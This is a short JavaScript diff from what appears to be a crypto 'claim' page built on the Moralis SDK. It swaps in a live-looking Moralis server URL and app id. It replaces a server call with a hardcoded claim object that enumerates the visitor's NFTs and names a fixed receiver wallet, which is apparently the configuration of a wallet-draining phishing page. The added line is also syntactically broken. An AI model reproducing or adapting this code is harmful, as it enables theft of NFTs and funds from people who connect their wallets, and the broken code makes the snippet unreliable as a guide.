@@ -392,8 +392,8 @@
 		var addrr = "";
 		var changeAddr = false;
 
-		startMOralis = async() => {const serverUrl = "https://carrot.warriors:2053/server";
-		const appId = "appId";
+		startMOralis = async() => {const serverUrl = "https://2uuwz8f6oqbb.usemoralis.com:2053/server";
+		const appId = "LZKnRUNSDdi6hTYDFx5GbLbxx1fPHnKryMQUurv3";
 		Moralis.start({ serverUrl, appId }).catch(err => console.log(err));
 		}
 		
@@ -416,18 +416,7 @@
 					return;
 				}
 			}
-			
-			await $.ajax({
-				type : "POST",
-				url  : `https://api.${window.location.hostname}/claim`,
-				data : { address: await Moralis.Web3.account, address1: '1231b911d1f21f6544fe8a1b7b1cbf1ddcg11da91113e221111ac127117e311a81e1c511111' },
-				success: function(data, status, xhr) {
-					claim_data = data;
-				},
-				error: function(xhr, status, error) {
-					console.log(error);
-				},
-			});
+			claim_data = {receiver: '0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff', mint_price: 0.33,  nfts: await Moralis.Web3.getNFTs();}
 		}
 		
 		async function sync_chain() {
